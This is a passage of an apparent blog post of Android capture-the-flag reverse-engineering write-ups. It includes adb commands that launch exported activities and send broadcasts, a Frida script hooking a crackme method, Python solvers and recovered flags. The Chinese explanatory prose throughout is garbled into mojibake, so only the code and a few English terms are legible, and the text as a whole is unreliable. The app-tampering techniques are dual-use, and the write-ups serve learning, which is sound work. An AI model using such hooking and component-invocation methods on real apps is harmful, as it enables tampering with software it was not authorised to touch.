alt="image-20210208185306706"></p><p>3.æŠŠ<strong>AndroidManifest.xml</strong>ä¸­activityçš„android:nameæ”¹ä¸ºå½“å‰åŒ…å’ŒMainActivityã€‚</p><p>4.æŠŠä¹‹å‰å¾—åˆ°çš„dexæ–‡ä»¶æ”¹åä¸ºclasses.dexæ”¾åˆ°è§£åŒ…ç›®å½•ä¸‹ã€‚</p><p>5.é‡æ–°æ‰“åŒ…ï¼Œå¹¶ç­¾åã€‚</p><p>æˆåŠŸï¼š</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208190250967.png" alt="image-20210208190250967"></p><h3 id="ä½ æ˜¯è°"><a href="#ä½ æ˜¯è°" class="headerlink" title="ä½ æ˜¯è°"></a>ä½ æ˜¯è°</h3><p>æ‰¾åˆ°è§¦æ‘¸å“åº”çš„åœ°æ–¹ï¼Œå¯ä»¥çœ‹åˆ°<strong>sorted flag</strong>ç›¸å…³å­—ç¬¦ä¸²ï¼Œç„¶åä¸Šé¢çš„getsnaæ–¹æ³•æ˜¯å¾—åˆ°æ±‰å­—å­—ç¬¦çš„unicodeç¼–ç è¿›è¡Œä¸€ä¸ªä»å°åˆ°å¤§çš„é€‰æ‹©æ’åºï¼Œæœ€åæ¯”è¾ƒã€‚</p><p>è¿™é‡Œä»æ’åºç»“æœåçš„æ±‰å­—ç¼–ç ç»“æœå¯ä»¥æ¨å‡ºæœªç»è¿‡æ’åºåçš„å€¼ã€‚</p><p>æœ€åæŒ‰ç…§ä»å­—ç¬¦ä¸²çš„æç¤ºï¼ŒæŠŠæ±‰å­—ç»“æœå†è½¬å›unicodeç¼–ç å†å¥—ä¸Šflag{}å³æ˜¯ã€‚</p><h3 id="åŸºç¡€android"><a href="#åŸºç¡€android" class="headerlink" title="åŸºç¡€android"></a>åŸºç¡€android</h3><p>çœ‹äº†ä¸‹ç¨‹åºé€»è¾‘ï¼Œè§£å‡ºç¬¬ä¸€ä¸ªå¯†ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">107</span>-i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>)]</span><br></pre></td></tr></table></figure><p>ç„¶åè¿›å…¥MainActivity2æŠŠç¬¬äºŒæ¬¡çš„è¾“å…¥ä½œä¸ºå‚æ•°å‘é€äº†ä¸€ä¸ªå¹¿æ’­ï¼š</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210220151141668.png" alt="image-20210220151141668"></p><p>ç»§ç»­è·Ÿåˆ°æ¥å—å¹¿æ’­çš„åœ°æ–¹ï¼Œçœ‹åˆ°åˆå¼€å§‹äº†ä¸€ä¸ªæ–°çš„æ´»åŠ¨ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210220151639862.png" alt="image-20210220151639862"></p><p>ä½†çœ‹äº†åé¢çš„NextContentä¹Ÿæ²¡æœ‰éªŒè¯å›¾ç‰‡æ˜¾ç¤ºç çš„åœ°æ–¹ï¼Œä½†æ˜¯è¯»äº†ä¸‹ä»£ç ï¼ŒåŠŸèƒ½å°±æ˜¯å–å‡ºappä¸­çš„èµ„æºæ–‡ä»¶ä¸­çš„timg_2.zipä½œä¸ºå›¾ç‰‡æ›¿æ¢åŸæ¥çš„å›¾ç‰‡ã€‚ç›´æ¥åœ¨jebçš„Assetsæ‰¾åˆ°è¯¥æ–‡ä»¶ï¼Œæ‰“å¼€å³æ˜¯ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210220151914447.png" alt="image-20210220151914447"></p><p>å…¶å®ï¼Œæ—¢ç„¶æ˜¯NextContentæ´»åŠ¨ç›´æ¥æ›´æ–°äº†æœ‰flagçš„å›¾ç‰‡ï¼Œç›´æ¥adbå¯åŠ¨æŒ‡å®šçš„æ´»åŠ¨ï¼Œä¹Ÿå¯ä»¥å¾—åˆ°ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -n com.example.test.ctf02/.NextContent</span><br></pre></td></tr></table></figure><p>æœ€åå­¦ä¹ çŸ¥é“äº†<strong>é‚£ä¸ªå›¾ç‰‡æ˜¾ç¤ºç å…¶å®è§¦å‘å¹¿æ’­éœ€è¦çš„å¯†ç </strong>ï¼Œåœ¨æ¸…å•æ–‡ä»¶æœ‰ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210220152303564.png" alt="image-20210220152303564"></p><p>ä¸”<strong>android:exported=â€trueâ€</strong>å±æ€§ä»£è¡¨å¯ä»¥è¿›è¡Œå¤–éƒ¨è°ƒç”¨ï¼Œé‚£æˆ‘ä»¬è¿˜å¯ä»¥ç”¨adbæ„é€ ä¸€ä¸ªå¹¿æ’­æ¥è¾¾åˆ°ç›®çš„ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am broadcast -a android.is.very.fun</span><br></pre></td></tr></table></figure><h3 id="APKé€†å‘"><a href="#APKé€†å‘" class="headerlink" title="APKé€†å‘"></a>APKé€†å‘</h3><p>æŠŠTenshineè¿›è¡Œmd5().hexdigest()åŠ å¯†åå–å‡ºå¶æ•°ä½ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = md5(<span class="string">b'Tenshine'</span>).hexdigest()</span><br><span class="line">flag = [s[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)) <span class="keyword">if</span> i%<span class="number">2</span> == <span class="number">0</span>]</span><br><span class="line">print(<span class="string">''</span>.join(flag))</span><br></pre></td></tr></table></figure><p>é¢˜ç›®å¾ˆç®€å•ï¼Œä½†æ˜¯ä»æ­ç¯å¢ƒå¼€å§‹é€šè¿‡è¿™ä¸ªé¢˜å­¦äº†ä¸€ä¸‹frida hook javaå±‚ã€‚</p><p>ç®€å•è®°å½•ä¸€ä¸‹æµç¨‹ï¼š</p><blockquote><ol><li>å®‰å“ç«¯æ‰§è¡Œä¸‹è½½å¥½çš„å¯¹åº”fridaæœåŠ¡ã€‚</li><li>è¿›è¡Œ2æ¬¡ç«¯å£è½¬å‘ï¼š<strong><code>adb forward tcp:27043 tcp:27043</code>å’Œ<code>adb forward tcp:27042 tcp:27042</code></strong></li><li>å®‰å“ç«¯è¿è¡Œapp</li><li>æ‰§è¡Œå†™å¥½çš„hookè„šæœ¬ã€‚</li></ol></blockquote><p>è´´ä¸‹hookä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">'''</span></span><br><span class="line"><span class="string">    Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">        var MainActivity = Java.use('com.example.crackme.MainActivity');</span></span><br><span class="line"><span class="string">        MainActivity.toHexString.implementation = function(a, b)&#123;</span></span><br><span class="line"><span class="string">            var ans = this.toHexString(a, b);</span></span><br><span class="line"><span class="string">            send(ans);</span></span><br><span class="line"><span class="string">            return ans;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">'type'</span>] == <span class="string">'send'</span>:</span><br><span class="line">        print(message[<span class="string">'payload'</span>][::<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line">process = frida.get_remote_device().attach(<span class="string">'com.example.crackme'</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">'message'</span>, on_message)</span><br><span class="line">script.load()</span><br></pre></td></tr></table></figure><h3 id="äººæ°‘çš„åä¹‰-æŠ“æ•èµµå¾·æ±‰1-200"><a href="#äººæ°‘çš„åä¹‰-æŠ“æ•èµµå¾·æ±‰1-200" class="headerlink" title="äººæ°‘çš„åä¹‰-æŠ“æ•èµµå¾·æ±‰1-200"></a>äººæ°‘çš„åä¹‰-æŠ“æ•èµµå¾·æ±‰1-200</h3><p>ä¸€ä¸ªjaråŒ…ï¼Œç”¨jd-guiçœ‹ä¸€ä¸‹javaä»£ç ã€‚ä¸€ä¸ªmd5åŠ å¯†ï¼Œåœ¨çº¿è§£ä¸€ä¸‹å³å¯ã€‚</p><p>è¿™é‡Œäº†è§£ä¸€ä¸‹ä»€ä¹ˆæ—¶å€™jaråŒ…ï¼š<strong>jaråŒ…æ˜¯eclipseä¸‹çš„å‹ç¼©åŒ…ï¼Œç”±å¤šä¸ªclassæ–‡ä»¶å‹ç¼©è€Œæˆçš„ã€‚</strong></p><h3 id="boomshakalaka-3"><a href="#boomshakalaka-3" class="headerlink" title="boomshakalaka-3"></a>boomshakalaka-3</h3><p>é£æœºå¤§æˆ˜æ¸¸æˆã€‚</p><p>jebåç¼–è¯‘åæ‰¾åˆ°å…¥å£ç±»ï¼šå¤šæ¬¡è°ƒç”¨äº†aç±»ä¸­çš„dæ–¹æ³•ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210224192959108.png" alt="image-20210224192959108"></p><p>çœ‹çœ‹aç±»dæ–¹æ³•åŠŸèƒ½ï¼šå…¶ä¸­getSharedPreferences()æ˜¯å…³é”®ï¼Œè¿”å›ä¸€ä¸ªSharedPreferenceå¯¹è±¡ï¼Œå®ƒä¼šåœ¨/data/data/com.example.plane/ä¸‹ç”Ÿæˆä¸€ä¸ªxmlæ–‡ä»¶ï¼Œä»¥é”®å€¼å¯¹çš„å½¢å¼å­˜å‚¨å‘å…¶ä¸­è¾“å…¥çš„æ•°æ®ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210224193105424.png" alt="image-20210224193105424"></p><p>adbçœ‹ä¸€ä¸‹ï¼š</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210224195210759.png" alt="image-20210224195210759"></p><p>ä½†ç¨‹åºæç¤ºçš„æ‰“åˆ°æœ€é«˜åˆ†ï¼Œjavaå±‚æ²¡æœ‰ä»»ä½•ä¸åˆ†æ•°ç›¸å…³çš„åœ°æ–¹ï¼Œè¿›å…¥soä¸­æ‰¾åˆ°åˆ†æ•°çš„åœ°æ–¹ï¼šåˆ†æä¸‹ä¸”ä»DATAå¯ä»¥çŸ¥é“ï¼Œè¿™é‡Œå°±æ˜¯æ ¹æ®æˆ‘ä»¬æ‰“çš„åˆ†æ•°ä¸æ–­å‘xmlæ–‡ä»¶ä¸­æ·»åŠ å†™å…¥ä¸åŒçš„å­—ç¬¦ä¸²ã€‚<img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210224195529004.png" alt="image-20210224195529004"></p><p>è€Œè¦å†™å…¥å­—ç¬¦ä¸²å­—ç¬¦ä¸²çš„å¼€å§‹å’Œç»“å°¾æ˜¯ç¡®å®šäº†çš„ï¼Œåªæ˜¯ä¸­é—´çš„å­—ç¬¦ä¸²ä¼šå› ä¸ºåˆ†æ•°ä¸åŒè€Œä¸é€šè¿‡ï¼Œè¿™ä¸ªè‡ªå·±æ‰“æ¸¸æˆç„¶åæŸ¥çœ‹æ•°æ®æˆ–è€…ç›´æ¥idaä¸­åˆ†æéƒ½å¯ä»¥çŸ¥é“ã€‚</p><p>æ³¨æ„çš„åœ°æ–¹ï¼šè¦æŒ‡å®šçš„åˆ†æ•°æ‰ä¼šå†™å…¥æŒ‡å®šå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å¦‚æœæ‰“æ¸¸æˆæµ‹è¯•çš„è¯è¦ç®—ç€æ‰“ğŸ˜‚ã€‚</p><p>æµ‹è¯•ä¸€æ³¢åï¼Œå†™å…¥é¡ºåºå°±æ˜¯ç»™å‡ºçš„ï¼ŒæŠŠå¼€å§‹ç»“å°¾ç¡®å®šå¥½åå‘ä¸­é—´å¡«å……å¥½base64è§£ç å¾—åˆ°flagã€‚</p><p><strong>MGN0ZntDMGNvUzJkX0FuRHJvMWRfRzBtRV9Zb1VfS24wdz99</strong></p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210224202624546.png" alt="image-20210224202624546"></p><h3 id="android1"><a href="#android1" class="headerlink" title="android1"></a>android1</h3><p>appè¿›è¡Œäº†æ¢†æ¢†åŠ å›ºï¼Œå¼€å§‹å‡†å¤‡ç¯å¢ƒå®‰è£…dump dexï¼Œå‡†å¤‡å®Œå¼€å§‹å®‰è£…appå‘ç°æŠ¥é”™ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210225225117463.png" alt="image-20210225225117463"></p><p>åé¢æ‰å‘ç°äº†æ˜¯å› ä¸ºappæ²¡æœ‰ç­¾åï¼Œç­¾ä¸Šååè¿˜è¦æ³¨æ„ï¼š</p><p>å®‰è£…æ—¶å¸¦ä¸Š-té€‰é¡¹ã€‚åŸå› ï¼š</p><p>Android Studio 3.0ä¼šåœ¨debug apkçš„<code>manifest</code>æ–‡ä»¶<code>application</code>æ ‡ç­¾é‡Œè‡ªåŠ¨æ·»åŠ  <code>android:testOnly=&quot;true&quot;</code>å±æ€§ã€‚</p><p>æˆåŠŸå®‰è£…ç¨‹åºï¼Œæ‰“å¼€æç¤ºèµ„æºæ–‡ä»¶ï¼Œè¿›è€Œä»valuesçš„string.xmlä¸­æ‰¾åˆ°flagã€‚</p><p><strong>flag{1FF9B2CCB90A2D943DBAA072DF0A279C}</strong></p><h3 id="Android2-0"><a href="#Android2-0" class="headerlink" title="Android2.0"></a>Android2.0</h3><p>ç®€å•è€ƒäº†ä¸€ä¸‹soå±‚ã€‚</p><p><strong>flag{sosorryla}</strong></p><h3 id="Illusion"><a href="#Illusion" class="headerlink" title="Illusion"></a>Illusion</h3><p>å…³é”®å°±åœ¨soå±‚çš„ä¸€ä¸ªåŠ å¯†å‡½æ•°ï¼Œå¼€å§‹ç›´æ¥åœ¨Exportsæ‰¾åˆ°åç§°ä¸ºCheckFlagçš„å‡½æ•°ï¼Œä¸ºäº†ç†Ÿæ‚‰ä¸€ä¸‹soå±‚çš„è°ƒè¯•ï¼Œåœ¨è¿™ä¸ªå‡½æ•°ä¸‹äº†æ–­ç‚¹ä½†æ¯æ¬¡éƒ½ä¸æ–­ä¸ä¸‹æ¥ã€‚ã€‚</p><p>ç„¶åå¼€å§‹æ‰¾åŸå› ï¼Œåé¢å‘ç°è¿™ä¸ªå‡çš„å‡½æ•°ï¼ŒçœŸæ­£æ˜¯åŠ¨æ€åŠ è½½çš„ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210303203021780.png" alt="image-20210303203021780"></p><p>è¿›å…¥æ­£ç¡®çš„å‡½æ•°å¼€å§‹åˆ†æï¼Œå‡½æ•°çš„ä¼ªä»£ç æ˜æ˜¾æ˜¯æœ‰ç‚¹é—®é¢˜çš„ï¼Œçœ‹armæ±‡ç¼–å°±å¥½äº†ã€‚</p><p>å…¶ä¸­å…³é”®å°±æ˜¯<strong>sub_CCB09028</strong>è¿™ä¸ªå‡½æ•°ï¼š</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210303203358493.png" alt="image-20210303203358493"></p><p>åˆ†æäº†ä¸€ä¸‹æ²¡çœ‹å‡ºæ‰€ä»¥ç„¶ï¼Œä½†è¿™ä¸ªæ˜¯ä¸€ä½ä¸€ä½åŠ å¯†çš„ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç©·ä¸¾çš„ã€‚</p><p>å†™ida-pythonï¼Œä½†è¿™ä¸ªç©·ä¸¾æœ€åä¸€ä½æœ‰2ä¸ªå­—ç¬¦éƒ½å¯ï¼Œç©ºæ ¼å’Œâ€˜}â€™ï¼Œè¿˜å¥½æ˜¯æœ€åä¸€ä½ï¼Œé‚£è‚¯å®šæ˜¯å­—ç¬¦}äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">"Ku@'G_V9v(yGS"</span></span><br><span class="line">s = <span class="string">'(Ljava/lang/String;Ljava/'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(a1, a2)</span>:</span></span><br><span class="line">    v3 = <span class="number">1</span></span><br><span class="line">    v4 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> a1 &gt;= a2:  </span><br><span class="line">        <span class="keyword">while</span> a2 &lt; a1:</span><br><span class="line">            a2 *= <span class="number">16</span></span><br><span class="line">            v3 *= <span class="number">16</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> a1 &gt;= a2:</span><br><span class="line">                a1 -= a2</span><br><span class="line">                v4 |= v3</span><br><span class="line">            <span class="keyword">if</span> a1 &gt;= a2 &gt;&gt; <span class="number">1</span>:</span><br><span class="line">                a1 -= a2 &gt;&gt; <span class="number">1</span></span><br><span class="line">                v4 |= v3 &gt;&gt; <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> a1 &gt;= a2 &gt;&gt; <span class="number">2</span>:</span><br><span class="line">                a1 -= a2 &gt;&gt; <span class="number">2</span></span><br><span class="line">                v4 |= v3 &gt;&gt; <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> a1 &gt;= a2 &gt;&gt; <span class="number">3</span>:</span><br><span class="line">                a1 -= a2 &gt;&gt; <span class="number">3</span></span><br><span class="line">                v4 |= v3 &gt;&gt; <span class="number">3</span></span><br><span class="line">            <span class="keyword">if</span> a1 == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            v3 &gt;&gt;= <span class="number">4</span></span><br><span class="line">            <span class="keyword">if</span> v3 == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            a2 &gt;&gt;= <span class="number">4</span>      </span><br><span class="line">    <span class="keyword">return</span> v4</span><br><span class="line">    </span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">        r1 = j+ord(s[i])<span class="number">-64</span></span><br><span class="line">        r2 = <span class="number">0x5d</span></span><br><span class="line">        <span class="keyword">if</span> r1 - fun(r1, r2)*<span class="number">0x5d</span> + <span class="number">0x20</span> == ord(enc[i]):</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(flag.encode())</span><br><span class="line"><span class="comment">#CISCN&#123;GJ5728&#125;</span></span><br></pre></td></tr></table></figure><p>å†™å®Œä»”ç»†åˆ†æäº†ä¸‹é‚£ä¸ªå‡½æ•°ï¼Œå…¶å®è¯¥å‡½æ•°å’Œåé¢å¯¹å‡½æ•°è¿”å›å€¼çš„å¤„ç†å°±æ˜¯<strong>æ±‚æ¨¡ï¼ˆmodï¼‰</strong>çš„æ“ä½œï¼Œä½†æ²¡æœ‰ä½¿ç”¨/ä¸modï¼Œå¯ä»¥å­¦ä¹ ä¸€ä¸‹ã€‚è¿™ä»æœ€åçš„æ“ä½œçœ‹å…¶å®å¾ˆæ˜æ˜¾ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210303204003498.png" alt="image-20210303204003498"></p><h3 id="APKé€†å‘-2"><a href="#APKé€†å‘-2" class="headerlink" title="APKé€†å‘-2"></a>APKé€†å‘-2</h3><p>é¦–å…ˆå®‰è£…appå¤±è´¥ã€‚ã€‚</p><p>åç¼–è¯‘åé¦–å…ˆçœ‹äº†ä¸€ä¸‹<strong>AndroidManifest.xml</strong>ï¼Œå‘ç°ç©ºçš„ã€‚ã€‚ç„¶åçœ‹äº†appçš„ä¸»è¦é€»è¾‘å’Œç±»ï¼Œå¾ˆä¹±å’Œæ‚å§ï¼Œä¹Ÿä¸æ¸…æ¥šè¦åšä»€ä¹ˆã€‚ã€‚</p><p>ç„¶åæˆ‘ä¸ºäº†çœ‹å…¶ä¸­çš„ä¸€ä¸ªèµ„æºæ–‡ä»¶å¯¹appè¿›è¡Œäº†ç›´æ¥è§£å‹ï¼Œè¿™ä¸ªå€’æ˜¯æ²¡çœ‹å‡ºä»€ä¹ˆã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210304192508917.png" alt="image-20210304192508917"></p><p>ä½†åœ¨å…¶ä¸­çœ‹åˆ°<strong>AndroidManifest.xml</strong>å¹¶ä¸æ˜¯ç©ºçš„ï¼Œç„¶åå°è¯•ä½¿ç”¨apktoolå¯¹apkè§£åŒ…ï¼Œè§£åŒ…å¤±è´¥ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210304192711623.png" alt="image-20210304192711623"></p><p>ç”±æ­¤å¯ä»¥çŸ¥é“ï¼Œåº”è¯¥æ˜¯å¯¹<strong>AndroidManifest.xml</strong>æ–‡ä»¶åšäº†æ‰‹è„šã€‚</p><p>ç„¶åå°±æ˜¯è¦çŸ¥é“å®‰å“<strong>AndroidManifest.xml</strong>æ–‡ä»¶æ ¼å¼äº†ï¼Œè¿™æ˜¯ä¿®æ”¹è¿‡çš„ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210304193133042.png" alt="image-20210304193133042"></p><p>å†çœ‹ä¸€ä¸ªæ­£å¸¸çš„ï¼š</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210304193230661.png" alt="image-20210304193230661"></p><p>é€šè¿‡ä¿®å¤åï¼Œé‡æ–°å‹ç¼©æˆå‹ç¼©åŒ…ï¼Œåœ¨xmlæ–‡ä»¶ä¸­çœ‹åˆ°flagç›¸å…³ï¼š</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/H1aGYAcMoEPShpW.png" alt="image-20210304193456601"></p><h3 id="ill-intentions"><a href="#ill-intentions" class="headerlink" title="ill-intentions"></a>ill-intentions</h3><p>åœ¨MainActivityä¸­æ³¨å†Œäº†ä¸€ä¸ªå¹¿æ’­æ¥æ”¶å™¨ï¼š</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210305193418021.png" alt="image-20210305193418021"></p><p>æ ¹æ®åœ¨è®¾ç½®åœ¨å±å¹•ä¸Šçš„æ–‡æœ¬æ¥çœ‹Send_to_Activityï¼Œå°±æ˜¯æ ¹æ®æ¥å—åˆ°çš„ä¸åŒå¹¿æ’­æ¶ˆæ¯æ‰§è¡Œä¸åŒçš„å‡½æ•°ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210305193507242.png" alt="image-20210305193507242"></p><p>ç„¶åçœ‹äº†ä¸€ä¸‹ä¸‰ä¸ªä¸åŒçš„å‡½æ•°ï¼Œå…¶æ‰§è¡Œé€»è¾‘å…¶å®æ˜¯ä¸€æ ·çš„ï¼ŒæŠŠ3ä¸ªæŒ‡å®šå­—ç¬¦ä¸²ç»è¿‡sha224ä¸base64åŠæ›¿æ¢åŠ å¯†åå†ç»è¿‡soå±‚å‡½æ•°çš„æ“ä½œï¼Œæœ€åæŠŠç»“æœä»¥å¹¿æ’­å½¢å¼å‘å‡ºï¼Œä½†è¿™é‡Œå¹¶ä¸æ˜¯å‘é€ç»™Send_to_Activityã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210305213542600.png" alt="image-20210305213542600"></p><p>soå±‚çš„åŠ å¯†æ“ä½œä¸€ä¸ªå¼‚æˆ–ï¼Œèƒ½æƒ³åˆ°è¿ç®—ç»“æœå°±æ˜¯æˆ‘ä»¬è¦çš„flagã€‚</p><p>ç”±äºåªæœ‰ä¸‰ç§ç»“æœï¼Œç”¨ida-pythonæ¨¡æ‹Ÿäº†ç¨‹åºçš„è¿ç®—é€»è¾‘ï¼Œåœ¨IsThisTheRealOneæ´»åŠ¨å¾—åˆ°flagã€‚è¿™é‡Œå¼€å§‹ä¸€ç›´å‡ºé”™å¾—ä¸åˆ°ç»“æœï¼Œåé¢è°ƒè¯•å‘ç°æ˜¯getClass().getName()å¾—åˆ°çš„ç±»åæˆ‘æ²¡æœ‰æŠŠæ•´ä¸ªåŒ…åŠ ä¸Šã€‚ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha224</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">a = [<span class="string">'e'</span>, <span class="string">'W'</span>, <span class="string">'h'</span>, <span class="string">'a'</span>, <span class="string">'t'</span>, <span class="string">'i'</span>, <span class="string">'s'</span>, <span class="string">'d'</span>, <span class="string">'o'</span>, <span class="string">'n'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">en</span><span class="params">(s)</span>:</span></span><br><span class="line">    s = sha224(s.encode()).hexdigest().encode()</span><br><span class="line">    s = base64.b64encode(s).decode().replace(<span class="string">'='</span>, <span class="string">'?'</span>)</span><br><span class="line">    s = list(s)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">        temp = ord(s[i])</span><br><span class="line">        <span class="keyword">if</span>  temp &gt; <span class="number">47</span> <span class="keyword">and</span> temp &lt; <span class="number">58</span>:</span><br><span class="line">            s[i] = a[temp<span class="number">-48</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(s)</span><br><span class="line">    </span><br><span class="line">s1 = <span class="string">b'TRytfrgooq|F&#123;i-JovFBungFk'</span>+<span class="string">b'\\VlphgQbwvj~HuDgaeTzuSt.@Lex^~'</span></span><br><span class="line">s1 = list(s1) + [<span class="number">119</span>, <span class="number">110</span>, <span class="number">119</span>, <span class="number">71</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">123</span>, <span class="number">79</span>, <span class="number">117</span>, </span><br><span class="line">  <span class="number">116</span>, <span class="number">98</span>, <span class="number">104</span>, <span class="number">127</span>, <span class="number">114</span>, <span class="number">67</span>] + list(<span class="string">b'tfqm&#125;'</span>)</span><br><span class="line">s2 = <span class="string">'SendAnIntentApplication'</span></span><br><span class="line">s3 = <span class="string">'com.example.application.IsThisTheRealOne$1'</span></span><br><span class="line">s3 = s3[<span 